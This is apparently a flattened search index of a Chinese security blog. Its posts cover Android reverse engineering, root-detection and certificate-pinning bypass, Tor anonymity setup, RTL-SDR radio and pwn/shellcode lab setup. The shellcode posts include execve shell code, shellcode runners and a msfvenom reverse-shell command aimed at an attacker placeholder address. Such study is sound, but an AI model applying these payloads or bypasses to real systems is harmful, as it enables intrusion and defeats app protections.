[{"title":"APK提取URL","url":"/2020/05/apk%E6%8F%90%E5%8F%96url/","content":"提取APK中的URLapktool d ssooking.apkgrep -ohr -E &quot;https?://[a-zA-Z0-9\\.\\/_&amp;=@$%?~#-]*&quot; ssooking |sort|uniq | grep ssooking.com &gt; res.txt\n\napkurlgrep\ngo get -u github.com/ndelphit/apkurlgrep\n\n其他工具：\n\nDiggy\nAppInfoScanner\napkleaks\nAndroid-Deeplink-Parser\nApkAnalyser\n\n","categories":["Android"],"tags":["Android"]},{"title":"APP安全基础","url":"/2019/09/app%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/","content":"认识APK文件\nAPK的全程是Android application package，是Android的应用程序包。\nAPK 是一个ZIP格式的文件，可以用解压软件解压。\n当你将APK文件解压之后你会看到如下文件：\nAndroidManifest.xml：manifest清单文件向Android系统提供应用的必要信息，系统必须具有这些信息方可运行APP代码。\n.dex代码文件：Dalvik虚拟机可执行文件，由java代码编译后class的文件转换而来\ndex文件相当于jvm虚拟机的class文件\ndex文件使用baksmail工具反编译成包含Dalvik字节码的smail文件\ndex文件使用dex2jar工具反编译成包含.class文件的 jar文件\n\n\nres目录：存放Android程序中所需要的一些资源，如图片、颜色、字符串、布局等资源；\nassets目录：存放的是原生资源文件，如字体，铃声等；\n\n\n\n反编译APK文件1.apktool反编译apk\n资源文件保护\n\nAndroid apk中的资源主要分为assets资源和res资源两类。​        Assets资源存放在APP的assets目录下，该类文件是一些原始文件，APP打包时并不会对其进行编译而是直接打包到APP中。对于这一类资源文件的访问，应用层代码需要通过文件名对其进行访问。Res资源则存放在APP的res目录下，该类资源在APP打包时大多会被编译，变成二进制文件，并会为每个该类文件赋予一个resource id。对于该类资源的访问，应用层代码则是通过resource id进行访问的。​        Android apk开发过程中公司大都提倡命名规范化,因此通过文件名称非常容易理解其含义，这样有利于开发者理解和维护应用，但是同时也给应用破解者提供了方便,破解者通过这些命名很容易便可找到他们需要的文件位置，并理解这些文件的意图。\n\nAPkTool用于提取处理apk的资源文件，使用ApkTool反编译APK得到AndroidManifest.xml和资源文件\napktool d calc.apk\n\n通过上述命令就可以反编译apk了，没有反编译前(直接解压)得到的AndroidManifest.xml是二进制文件，无法查看，使用apktool反编译后可以正常查看。\n反编译前：AndroidManifest.xml: Android binary XML反编译后：AndroidManifest.xml: XML 1.0 document text, ASCII text\n\n2.dex2jar反编译dex文件\n首先解压apk，提取dex文件，然后使用dex2jar反编译\nd2j-dex2jar classes.dex\n\n此时会生成classes-dex2jar.jar文件，然后使用jar反编译工具即可查看java源码，如jd-GUI、jadx、Luyten。\n 一个快速反编译apk的脚本\n#!/bin/bashapktool d $1 &amp;&amp; cp $1 $1.zip &amp;&amp; unzip $1.zip &quot;*.dex&quot; -d $1_dex/ &amp;&amp; rm $1.zip &amp;&amp; cd $1_dex/ &amp;&amp; d2j-dex2jar *.dex\n\n\n\n类似的一个快速反编译apk项目：https://github.com/JavaNoober/android-apk-decompile\nAPP逆向分析 objection 注入操作\nobjection -g com.timanetworks.android.faw.vw.aftermarket.release explore\n\ndrozer \ndrozer agent\nhttps://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk\n如果客户端做了证书验证，安装xposed框架和JustTrustMe模块，抹掉证书验证逻辑，再进行抓包分析。\n或者用objection、Firda\nadb连接单个模拟器\n夜神模拟器，x86架构# adb connect 127.0.0.1:62001 网易MUMU模拟器# adb connect 127.0.0.1:7555 逍遥安卓模拟器# adb connect 127.0.0.1:21503 天天模拟器# adb connect 127.0.0.1:6555 海马玩模拟器 # adb connect 127.0.0.1:53001 蓝叠模拟器,支持arm架构# adb connect 127.0.0.1:5555 2.断开模拟器# adb disconnect 127.0.0.1:62001\n\n\n\n学习资料\nAndroid-反混淆神器JEB2的使用简介\n\nhttp://www.devio.org/2018/05/08/Android-reverse-engineering-for-mac/\n\nhttps://vavkamil.cz/2019/09/15/how-to-bypass-android-certificate-pinning-and-intercept-ssl-traffic/\n\nAPP Https双向认证抓包\n\n扭转HackEx - 一款安卓游戏\n\n26款优秀的Android逆向工程工具\n\n2018年最流行安卓黑客工具集萃\n\nhttps://labs.f-secure.com/tools/drozer/\n\n\n","categories":["Android"],"tags":["Android"]},{"title":"Android Bypass Root Detection","url":"/2020/09/android-bypass-root-detection/","content":"常见方法RootCloakRootCloak是非常流行的Xposed模块，可用于隐藏设备的根状态。即使模块的回购页面显示“具有5.x和6.x支持”并且我的设备运行的是Android 9.0，我仍然尝试过。\n\n***Bypass Root Check Using Xposed:*1) Install Xposed https://repo.xposed.info/module/de.robv.android.xposed.installer2) Install “RootCloak” (Xposed Module)3) Open RootCloak &gt; Add&#x2F;Remove Apps &gt; (select target app) and tap it.4) Done! (open app and check if it’s works)\n\nUnRootBeerUnRootBeer](https://github.com/jakev/unrootbeer)是另一个Xposed模块，专门开发用于禁用RootBeer库执行的检查。要使用此工具，只需安装[APK文件](https://github.com/jakev/unrootbeer/raw/master/out/jakev.unrootbeer-debug.apk)，然后重新启动设备以激活该模块。\nObjectionObjection是由Frida提供支持的运行时工具包。使用命令android root disable，异议将尝试绕过应用程序的根检测机制。\nobjection -g &quot;com.navinfo.gw&quot; explore\n\n\n\nMagisk隐藏Magisk的功能之一是Magisk Hide，它可用于绕过根检测和系统完整性检查。\n从Magisk v20.4开始，默认情况下将禁用Magisk Hide。要启用此功能，请打开Magisk Manager，在边栏中单击设置，将Magisk Hide选项切换为ON ，然后重新启动应用程序。\n将RootBeer Sample添加到Magisk Hide之后，结果是接近完美的分数，通过了11张检查中的10张。\nFridantiroot下一个工具涉及Frida，它是一个动态的检测工具包，可用于篡改应用程序的过程。在本实验中，使用了公共可用的JS脚本（Fridantiroot）。但是，此脚本在我的设备上不起作用。\n幸运的是，我发现了适用于我的设备的Fridantiroot的修改版本。\nfrida -U --no-pause -f com.xxxx.xxx -l root_bypass.js\n\n\n\n手工分析APKBypass Root Check Manual Way:1) Decompile the APK file using “APKTool”# apktool d /path/to/apk/target.apk -o /path/to/output/(“d” for “decompile” and “-o” for output dir)2) Most root detection techniques rely on checking for files on the OS that indicate the device has been rooted. Using GREP, search for any of the follow strings and change them to something random:- Superuser- Supersu- /su- /system/app/Superuser.apk- /system/bin- /system/bin/su- /system/sd/xbin- /system/xbin/su- /system/xbin- /data/local- /data/local/bin- /data/local/xbin- /sbin- /system/bin/failsafe- /vendor/binNote: Other detection techniques look for any of the below-installed packages on the mobile device at runtime:- supersu.apk- Busybox- Root Cloak- Xpose framework- Cydia- Substrate3) Build the new version of APK with APKTool:# apktool b /path/to/modified apk/target-new.apk -o /path/to/output/(“b” for “build” and “-o” for output dir)4) Sign with jarsigner tool# /path/to/my-key.keystore -storepass password -keypass password target-new.apk alias_name(You may need to generate the keystore first with keytool:)# keytool -genkey -v -keystore my-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity100005) Finally, install the new version and enjoy!\n\n\n\n\n\n参考Comparison of Different Android Root-Detection Bypass Tools\nAndroid: How to Bypass Root Check and Certificate Pinning\nAndroid root detection bypass by reverse engineering APK\n","categories":["Android"],"tags":["Android"]},{"title":"Android安全练习程序","url":"/2020/09/android%E5%AE%89%E5%85%A8%E7%BB%83%E4%B9%A0%E7%A8%8B%E5%BA%8F/","content":"OWASP MSTGsg.vp.owasp_mobile.OMTG_Android\n\n\n\nDIVADIVA是Payatu Labs的Aseem Jakhar创建的不安全和易受攻击的Android应用程序\n https://www.0daydown.com/06/566602.html\nhttps://github.com/payatu/diva-android\nPIVAA更新代替DIVA的\nhttps://github.com/HTBridge/pivaa\n","categories":["Android"],"tags":["Android"]},{"title":"Keep Anonymous in Kali","url":"/2017/10/keep-anonymous-in-kali/","content":"整个系统应用TOR匿名，Anonsurf在后台运行并不断更改IP地址。\n\n注意，国内环境下前提是你的kali能够翻&amp;墙\n\n安装配置torapt-get install tor\n\n去bridges.torproject.org获取bridges信息，然后修改/etc/tor/torrc文件，添加如下内容：\nBridge 158.69.204.189:990 5A5103F99EDA9E2F136CE38F3C041C0D67320EFCBridge 77.198.28.226:37911 E27AAA7EE9F15324A02115ADD85136295F796211Bridge 96.230.139.74:9001 5F3B7E2CDB9D420F9FBAC6C764BA62D49CF68DE3VirtualAddrNetwork 10.192.0.0/10AutomapHostsOnResolve 1TransPort 9040SocksPort 9050DNSPort 53RunAsDaemon 1SocksListenAddress 127.0.0.1\n\n开启tor服务，测试可用性：\nservice tor startsystemctl status tornetstat -antu | grep 9050tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN\n\n此时，为浏览器设置socks5代理，端口设置为9050。此时我们访问任意.onion站点，如DuckDuckGo，测试是否处于tor网络下。如果能够正常访问onion网站以及其他网站，说明tor配置正确。\n安装Anonsurfgit clone https://github.com/Und3rf10w/kali-anonsurf.gitcd kali-anonsurf/sudo ./installer.sh\n\n在Kali Linux，安装完毕后，anonsurf会自动更新编辑/etc/tor/torrc文件并添加以下几行：\nVirtualAddrNetwork 10.192.0.0/10AutomapHostsOnResolve 1TransPort 9040SocksPort 9050DNSPort 53RunAsDaemon 1\n\n它还会将解析程序配置更改为以下内容：\nnameserver 127.0.0.1nameserver 209.222.18.222nameserver 209.222.18.218\n\n如果你不喜欢使用专用Internet访问DNS，只需在/etc/init.d/anonsurf脚本中更改以下行中的DNS ：\necho -e &#x27;nameserver 127.0.0.1\\nnameserver 209.222.18.222\\nnameserver 209.222.18.218&#x27; &gt; /etc/resolv.confecho -e &quot; $GREEN*$BLUE Modified resolv.conf to use Tor and Private Internet Access DNS&quot;\n\n\n\n我们可以启动anonsurf，通过tor传输数据：\n以后使用时，我们不必提前开启tor服务，anonsurf会自动帮我们完成。\nanonsurf start\n\n关闭anonsurf\nanonsurf stop\n\n帮助命令\nanonsurf   \t#查看帮助anonsurf start  #开启隐身anonsurf myip  \t#查看自己的ipanonsurf restart #可以更换代理IPanonsurf stop  \t#停止隐身anonsurf starti2p #开启i2p服务anonsurf stopi2p \t#关闭i2p服务\n\n\n\n安装I2P(可选)1.添加源\necho &quot;deb https://deb.i2p2.de/ wheezy main&quot; &gt;&gt; /etc/apt/sources.list\n\n2.添加deb.i2p2.de的public key\napt-key adv --recv 67ECE5605BCF1346\n\n如果不添加public key，等会更新时可能会报错如下：\nGPG error: https://deb.i2p2.de wheezy InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY 67ECE5605BCF1346\n\n3.安装i2p\napt-get updateapt-get install i2p i2p-keyring\n\n\n\n测试匿名性我们可以使用anonsurf myip命令查看自己的ip是否已经匿名。\n另外，我们可以访问一下网站检查是否泄漏了DNS\ndnsleak\ndns-leaktest\n在此处检查是否泄漏了IPv6：ipv6leak\n","categories":["科学上网"],"tags":["kali","linux","Tor"]},{"title":"Windows Keep Anonymous","url":"/2019/01/windows-keep-anonymous/","content":"Windows Keep AnonymousMac地址修改：\n\nTechnitium MAC Address Changer\n\n硬盘序列号修改工具\n\n6种更改或欺骗硬盘硬件序列号和卷ID的工具\nhttps://github.com/breezechen/hdsnspoofer\n\nWindows Install Tor Service下载\n\nTor Brwser：https://www.torproject.org/download/\n\nTor Windows Expert Bundle：https://www.torproject.org/download/tor/\n\n\n解压tor-win32-0.4.4.5.zip，执行tor.exe\n$ E:\\tor-win32-0.4.4.5\\Tor&gt;tor.exe....Bootstrapped 95% (circuit_create): Establishing a Tor circuitBootstrapped 100% (done): Done\n\n出现100% (done)的输出说明Tor正常工作了，但是关闭窗口tor将停止运行，我们可以将tor其作为服务安装。\n首先在Tor目录E:\\tor-win32-0.4.4.5\\下创建torrc配置文件，内容如下：\n## Configure Data DirectoryDataDirectory E:\\tor-win32-0.4.4.5\\Data\\TorGeoIPFile E:\\tor-win32-0.4.4.5\\Data\\Tor\\geoipGeoIPv6File E:\\tor-win32-0.4.4.5\\Data\\Tor\\geoip6## Use Proxy Connect Tor# HTTPSProxy 127.0.0.1:8118# SOCKS5Proxy 127.0.0.1:1080## Bind to this port to listen connections from SOCKS-speaking applications.SocksPort 9050DNSPort auto#If you start to get errors enable the log to see it.#Log err file E:\\tor-win32-0.4.4.5\\Data\\Tor\\error.log\n\n然后安装Tor服务，设置启动参数，启动时加载配置文件。\n$ E:\\tor-win32-0.4.4.5\\Tor&gt;tor.exe --service install -options -f &quot;E:\\tor-win32-0.4.4.5\\torrc&quot;\n\n启动和停止Tor服务：\ntor.exe --service starttor.exe --service stop\n\n删除Tor服务（必须先停止服务）：\ntor.exe --service remove\n\n\n\n查看tor默认端口9050是否监听，确认tor服务正常启动\nnetstat -aon | findstr &quot;:9050&quot;for /f &quot;tokens=1,2,3,4,5*&quot; %i in (&#x27;netstat -ano ^| findstr &quot;:9050&quot; ^| findstr /i listening&#x27;) do echo %j %l &amp; @tasklist | findstr %m\n\n如果Tor服务成功启动，只需要全局设置socks5代理即可，端口9050\n可以使用：Privoxy、Proxifier、\nprivoxy配置\nforward-socks5 / 127.0.0.1:1080 .listen-address 127.0.0.1:8118    \t# 可改为0.0.0.0:8118 允许局域网的连接\n\n\n\nMozzila设置\ngeo.enabled = falsegeo.wifi.uri = [leave blank]network.http.accept.default = text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8network.http.use-cache = falsenetwork.http.keep-alive.timeout = 600network.http.max-persistent-connections-per-proxy = 16network.proxy.socks_remote_dns = truenetwork.cookie.lifetimePolicy = 2network.http.sendRefererHeader = 0network.http.sendSecureXSiteReferrer = falsenetwork.protocol-handler.external = false [set the default and all the subsettings to false]network.protocol-handler.warn-external = true [set the default and all the subsettings to true]network.http.pipelining = truenetwork.http.pipelining.maxrequests = 8network.http.proxy.keep-alive = truenetwork.http.proxy.pipelining = truenetwork.prefetch-next = falsebrowser.cache.disk.enable = falsebrowser.cache.offline.enable = falsebrowser.sessionstore.privacy_level = 2browser.sessionhistory.max_entries = 2browser.display.use_document_fonts = 0intl.charsetmenu.browser.cache = ISO-8859-9, windows-1252, windows-1251, ISO-8859-1, UTF-8dom.storage.enabled = falseextensions.blocklist.enabled = false\n\n\n\nReferencehttps://www.reddit.com/r/TOR/comments/8b93g3/install_tor_as_a_windows_service/\nHow to install Tor and create Tor hidden service on Windows\n","categories":["科学上网","Tor"],"tags":["Anonymous"]},{"title":"RTL-SDR收听广播","url":"/2020/01/rtl-sdr%E6%94%B6%E5%90%AC%E5%B9%BF%E6%92%AD/","content":"前言FM带宽：88-108Mhz。\n主要步骤：\n\n接收无线电信号：RTL-SDR\n解调无线电信号：使用GQRX解调接收到的无线电信号\n\n在操作之前，确认已经搭建好了SDR环境，rtl-sdr设备正常工作\n启动GQRX1.选择RTL设备如果是第一次启动gqrx，会进入到下图所示界面，此时可以进行一些基本的参数设备，下次启动时就会默认使用上一次的配置。这些配置都可以在进入软件后更改。这里需要在Device选项里选择RTL-SDR设备，其他参数可不设置。\n\n\nps：如果想恢复初始设置，删除~/.config/gqrx/即可\n\n在Device选项里选择我们的RTL-SDR设备Realtek RTL2838UHIDIR SN:00000001，然后点击OK进入程序，此时就进入了gqrx的主界面。单击绿色图标可以切换SDR设备。\n\n2.捕获无线电信号在捕获无线电广播信号之前，我们需要先进行一些必要的设置。\n首先，如图所示，871 Mhz是RTL-SDR调谐到或收听的频率。由于FM频道带宽在88-108Mhz，因此我们需要调整这个参数值在这个范围。我们可以在频率数字上拖动点击鼠标指针到合适的位置，也可以直接修改Frequency的值，它是将MHz转换为KHz，即乘以1000的结果。\n\n这里有个小tips，可以先用手机自带的FM收音机功能扫描下可用的频道，然后再设置。\n\n另外，把Mode设置成WFM(mono)模式，即单声道，然后点击白色箭头图标（绿色网卡状图标左边），开始捕获无线电信号。\n\n3.测试和微调有时候听不到声音，可以通过一些技巧来进行微调，如：\n\n把Filter width设置为Wide\n\n调整Gain的值\n\n\n更多技巧可以参考Practical tricks and tips\nUseful Commands\nGet rtl_fm_new data to listen to &#x2F; decode: \nmysql --binary-mode -e &quot;select group_concat(data separator &#x27;&#x27;) from intercepts order by date, time;&quot; -A -B -r -L -N freqwatch -u freqwatch -p &gt; output\n\nOr better yet, use intercept.py in the rtl_fm directory\n\nIntercept WBFM: \nrtl_fm -f 95.7e6 -s 170k -A fast -r 32k -l 0 | play -r 32k -t raw -e s -b 16 -c 1 -V1 - (they suggest using -E deemp, but that doesn&#x27;t work for me)\n\nListen to WBFM on the command line: cat file | play -t raw -r 32k -e signed-integer -b 16 -c 1 -V1 -\n\n\n使用下面的命令收听并播放FM信号\nrtl_fm -f 92.7e6 -M wbfm -s 200000 -r 48000 - | aplay -r 48k -f S16_LE\n\n\n\n启动不了gqrx在确保安装了gqrx-sdr的情况下，启动时报错如下：\n&quot;Pulseaudio error: Connection refused&quot;\n\n解决方法：\nsudo pulseaudio -Droot权限：pulseaudio -D --system# 没有pulseaudio就先安装sudo apt-get install pulseaudio\n\n\n\nReference\nhttps://dast.org/gqrx-sdr-ubuntu-rtl-tcp.html\n\nhttps://payatu.com/blog/Nitesh-Malviya/getting-started-radio-hacking-part-2-listening-fm-using-rtl-sdr-gqrx\n\nhttps://danielpocock.com/quickstart-sdr-ham-radio-gqrx-gnu-radio/\n\nhttps://electronicsforu.com/electronics-projects/fm-receiver-gnu-radio-rtl-sdr-dongle\n\n\n","categories":["IOT"],"tags":["RTL-SDR"]},{"title":"Linux Pwn环境设置","url":"/2019/12/linux-pwn%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE/","content":"系统推荐\nREMnux：Ubuntu14.04 64位\nSEEDLabs：Ubuntu16.04 32位\n\n系统环境Ubuntu16.04 xenial 32\n$ dpkg --print-architecturei386# 可选源# deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse\n\n使用Ubuntu 16.04，因为该发行版默认已经开启了内核调试支持\n$ cat /boot/config-4.8.0-36-generic |grep GDB# CONFIG_CFG80211_INTERNAL_REGDB is not setCONFIG_SERIAL_KGDB_NMI=yCONFIG_GDB_SCRIPTS=yCONFIG_HAVE_ARCH_KGDB=yCONFIG_KGDB=yCONFIG_KGDB_SERIAL_CONSOLE=y# CONFIG_KGDB_TESTS is not setCONFIG_KGDB_LOW_LEVEL_TRAP=yCONFIG_KGDB_KDB=y\n\n\n\n安装增强功能\n\nps：SEEDLabs Ubuntu16.04 32安装open-vm-tools-desktop会无法正常使用桌面环境。解决方法是安装旧版本的vmware-tools。\n\n安装一些编译32位C程序的依赖\n32位系统上\nsudo apt-get update -ysudo apt-get install libc6-dev lib32readline-gplv2-dev\n\n\n\n\nOn 32-bit Ubuntu, skip that package. Just install libc6-dev and whatever other packages you need.\nThe specific package that corresponds to libc6-dev-i386 for a 32-bit system is just libc6-dev, which you are already installing.\nThere is no libc6-dev-i386 package for your system, because it’s only available on 64-bit systems. This, in turn, is because its purpose is to provide you with the ability to build and run 32-bit programs on a 64-bit system.\nhttps://askubuntu.com/questions/947927/unable-to-locate-package-libc6-dev-i386\n\n64位系统上\nsudo apt-get update -y# sudo dpkg --add-architecture i386sudo apt-get install lib32z1 libc6-dev-i386 lib32readline-gplv2-dev\n\n在64位系统上使用linux32命令进入32位环境。\n关闭安全防护Ubuntu和其他Linux发行版已经实现了几种安全机制，使缓冲区溢出攻击变得困难，因此如果出于学习和测试目的，我们可以先关闭这些安全防护功能。\necho 0 &gt; /proc/sys/kernel/exec-shield\t\t\t\t\t\t\t#turn it offecho 0 &gt; /proc/sys/kernel/randomize_va_space\t\t\t#turn it offecho 1 &gt; /proc/sys/kernel/exec-shield\t\t\t\t\t\t\t#turn it onecho 1 &gt; /proc/sys/kernel/randomize_va_space\t\t\t#turn it on\n\n\n\n\n\n地址空间随机化地址空间布局随机化(ASLR)，ASLR会随机化可执行文件的堆和栈的起始地址以及关键数据区地址，给缓冲区漏洞的利用带来困难。测试时可以先关闭这个功能。\n# /proc/sys/kernel/randomize_va_spacesudo sysctl -w kernel.randomize_va_space=0# orecho 0 &gt; /proc/sys/kernel/randomize_va_space\n\n\n\nStackGuard ProtectionGCC编译器实现了一种称为StackGuard的安全机制来防止缓冲区溢出。有了这种保护，缓冲区溢出攻击将不起作用。我们可以在编译期间使用-fno-stack-保护者选项禁用此保护。例如，要编译一个禁用StackGuard的程序example.c，可以执行以下操作:\n$ gcc -fno-stack-protector example.c\n\n\n\nNon-Executable StackUbuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a ﬁeld in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the recent versions of gcc, and by default, stacks are set to be non-executable (further reading: [3]). To change that, use the following option when compiling programs:\nFor executable stack:\n$ gcc -z execstack -o test test.cFor non-executable stack:$ gcc -z noexecstack -o test test.c\n\n\n\nConﬁguring &#x2F;bin&#x2F;shUbuntu 16.04 VM only\nshellcode此外，为了进一步防范缓冲区溢出攻击及其它利用shell程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个Set-UID程序调用一个shell，也不能在这个shell中保持root权限，这个防护措施在&#x2F;bin&#x2F;bash中实现。linux系统中，&#x2F;bin&#x2F;sh实际是指向&#x2F;bin&#x2F;bash或&#x2F;bin&#x2F;dash的一个符号链接。为了重现这一防护措施被实现之前的情形，我们使用另一个shell程序（zsh）代替&#x2F;bin&#x2F;bash。下面的指令描述了如何设置zsh程序：\nsudo rm /bin/shsudo ln -s /bin/zsh /bin/sh\n\n\n\n\n\nDEP(NX) 不允许执行栈上的数据RELRO 这个介绍有点长分为两种:1.Partial RELRO GOT表仍然可写2.Full RELRO GOT表只读ASLR(PIE 随机化系统调用地址stack 栈溢出保护\n缓冲区溢出保护机制——Linux\nhttps://blog.csdn.net/woaisk/article/details/82531761\nchecksec\nhttps://blog.csdn.net/qq_37414405/article/details/84846551\n这里简单介绍一下各字段的含义：\nArch：只文件运行的平台为：32位的i386，小端字节序列RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX: (No-eXecute) 不可执行的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。若为：NX enabled 这个保护就会开启，意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过PIE: (Postion-Indenpendent executable）地址无关可执行文件，对应windows上ASLR机制，一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。若为：PIE enabled，则程序开启了这个地址随机化选项，就意味着程序每次运行的时候地址都会变化，而现在是没有开PIE的，那么No PIE (0x8048000)，括号内的数据就是程序的基地址RXW：即我们平常对文件的三个权限 read execute write，这里指有可读可写可执行的段。\n\n\n\n\n\nWindows安全机制\n缓冲区溢出Stack-Guard\u000b针对修改栈空间上函数返回地址的攻击，Stack-Guard给出两种方式阻止攻击：1.在函数返回前检测函数返回地址是否被修改；2.阻止任何程序对函数返回地址的修改。ProPolice的主题思想和StackGuard很相似，他们也是使用canary值来检测堆栈攻击。他们的创新之处在于他们重新安排本地变量使得char缓冲区一直是在顶部来保护栈，这样其他的本地变量就不会被溢出破坏CCured是C中加强类型及边界检查的研究，他们都是采用动静结合方式。CCured 辨别的目的在于防止指针的不恰当时使用，并且可以防止程序进入其不应该进入的内存区域。Chaperon针对二进制代码检测缓冲区溢出，不需要源代码的支持。它可以截取malloc和free系统调用，检测堆访问的合法性；并且可以检测出堆上的内存泄漏；以及对未初始化内存的访问。相比于堆上的缓冲区溢出检测，Chaperon对栈缓冲区溢出检测比较简单粗糙。探测代码有时也会因为缓冲区溢出而被覆盖，导致最后给出错误的缓冲区溢出信息Libsafe实际上是一个动静结合的工具。静态的方面，他为C中的库函数中一些潜在的缓冲区溢出漏洞打补丁。在实际的函数调用前做一个边界检查可以保证返回值和基指针不被重写。Memcheck通过为内存的每个比特位建立影子内存从而更准确的发现比特级别的内存错误。对每一次内存操作Memcheck都需要进行探测并对影子内存进行相应的修改。由此带来的是性能上的严重损失，通常会比正常运行程序慢20-30倍\n编译程序打开栈执行，并且给程序可执行权限\nhttps://www.anquanke.com/post/id/85138\n$ gcc -g -fno-stack-protector -z execstack -o vul1 vul1.c$ chmod +s vul1  //给程序可执行权限\n\n编译方式：\ngcc -O0 -g -m32 -fno-stack-protector -z execstack 1.c -o 1\n\n参数解释：\n\n-O0: 不进行任何优化\n-g：使程序包含调试信息以进行源码级调试\n-m32：生成32位程序 (x86机器上编译不用加)\n-fno-stack-protector: 不开启canary栈溢出检测\n-z execstack: 开启栈可执行，关闭NX\n\ngcc -g参数生成的程序，编译时会把调试信息加到可执行文件中，这样可以便于gdb调试，如使用list 1,20命令查看代码。\n一些工具gdb: apt-get install gdbgcc: apt-get install gccgdb-peda: https://github.com/longld/pedapwntools: pip install pwntoolsgcc-multilib: apt-get install gcc-multilibsocat: apt-get install socatrp++: https://github.com/0vercl0k/rpreadelf: apt-get install readelf\n\n\n\n\n\n教程Binary Security Assembly Course\n","categories":["Pwn"],"tags":["Pwn"]},{"title":"Linux Shellcode开发","url":"/2020/01/linux-shellcode%E5%BC%80%E5%8F%91/","content":"如果是64位系统需要安装32位依赖库：\nsudo apt-get install lib32z1 lib32ncurses-dev\n\n查阅Linux系统调用文档：http://syscalls.kernelgrok.com/。\n编译Shellcode汇编代码编译nasm -f elf32 Asamblare.asm -o shellcode.old -m elf_i386 -s -o T3jv1l shellcode.o./T3jv1l\n\n\n\nC代码编译用C写一个getshell的程序shell.c：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;  execve(&quot;/bin/sh&quot;, 0, 0);  return 0;          &#125;\n\n编译：\ngcc -O0 -fno-stack-protector -z execstack -m32 shell.c -o shell\n\n参数解释：\n\n-g：允许gdb进行源码级调试\n-m32：生成32位程序 (x64机器上编译32位程序需要加)\n-O0: 不进行任何优化\n-fno-stack-protector: 不开启canary栈溢出检测\n-z execstack: 开启栈可执行关闭 NX\n\n反汇编程序使用objdump反汇编shell程序，查看汇编代码：\nobjdump -d shell\n\n为了方便的提取shell code，可以使用下面的命令：\nfor i in `objdump -d shell | tr &#x27;\\t&#x27; &#x27; &#x27; | tr &#x27; &#x27; &#x27;\\n&#x27; | egrep &#x27;^[0-9a-f]&#123;2&#125;$&#x27; ` ; do echo -n &quot;\\\\x$i&quot; ; done &gt; shellcode.txt\n\n这里有个方便的工具Sh3llshock可以提取。\n#include &lt;&quot;stdio.h&quot;&gt;char shellcode[] =&quot;\\xeb\\x19\\x31\\xc0\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x59\\x31\\xd2\\xb2\\x16\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x01\\xcd\\x80\\xe8\\xe2\\xff\\xff\\xff\\x45\\x76\\x31\\x6c\\x20\\x68\\x34\\x63\\x6b\\x20\\x54\\x33\\x6a\\x76\\x31\\x6c\\x20\\x31\\x33\\x33\\x37\\x3f\\x20&quot;;int main(int argc, char **argv) &#123;\tint *ret;\tret = (int *)&amp;ret + 2;\t(*ret) = (int)shellcode;&#125;\n\n\n\n\n\n#include &lt;&#x27;stdio.h&#x27;&gt;    //IO header#include &lt;&#x27;sys/mman.h&#x27;&gt; //MMAN sys func#include &lt;&#x27;string.h&#x27;&gt;   //Functions on favor of strings#include &lt;&#x27;stdlib.h&#x27;&gt;   //Define Var types#include &lt;&#x27;unistd.h&#x27;&gt;   //Defines misc symbolic constants and types, and declares misc functions/* Global Variable type int, shellcode to test is a function pointer */int (*shellcodetotest)();      char shellcode[] = &quot;\\xeb\\x35\\x31\\xc0\\x31\\xdb\\x31\\xcxxxxx&quot;; /* Global array */    int main(int argc, char **argv) &#123;    \tvoid *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0); /* Mmap functions passed to *ptr pointer */    \tif(ptr == MAP_FAILED)&#123;    \t\tperror(&quot;mmap&quot;);  /* Func to error of program */    \t\texit(-1);    printf(&quot;Shellcode Length:  %d\\n&quot;, strlen(shellcode));    \t&#125;    \tmemcpy(ptr, shellcode, sizeof(shellcode)); /* Memcpy function */    \tshellcodetotest = ptr;\t/* Here we test the shellcode with mmap functions */    \tshellcodetotest();   /* Exec the shellcode */    \treturn 0;          /* return */    &#125;    &#125;\n\n\n\nmsfvenom -a x86 –platform Windows -p windows/shell_reverse_tcp LHOST=&lt;attacker’s IP address&gt; LPORT=4444 -e x86/shikata_ga_nai -b ‘\\x00’ -f python\n\n\n\n\n\nReferencehttps://nutcrackerssecurity.github.io/Shellcode.html\nhttps://nutcrackerssecurity.github.io/Shellcode1.html\n","categories":["Pwn"],"tags":["Shellcode"]},{"title":"binary to shellcode","url":"/2020/01/binary-to-shellcode/","content":"从二进制文件中转储shellcode的Tips：\n\nhexdump command\npython scripts\n\nhexdumphexdump -v -e &#x27;&quot;\\\\&quot;&quot;x&quot; 1/1 &quot;%02x&quot; &quot;&quot;&#x27; filename\n\n\n\npythonbin2shellcode.py\n#!/usr/bin/env python# -*- coding: utf-8 -*-# @ Author: ssooking# @ Blog  : https://ssooking.github.io# @ Github: https://github.com/ssookingimport sysdef bin2shellcode(binfile):\tbinary = open(binfile,&#x27;rb&#x27;)\tfor byte in binary.read():\t\tsys.stdout.write(&quot;\\\\x&quot;+byte.encode(&quot;hex&quot;))\tprint &quot;&quot;if __name__ == &quot;__main__&quot;:\tif len(sys.argv) &lt; 2:\t\tprint &quot;\\nUsage: python bin2shellcode.py 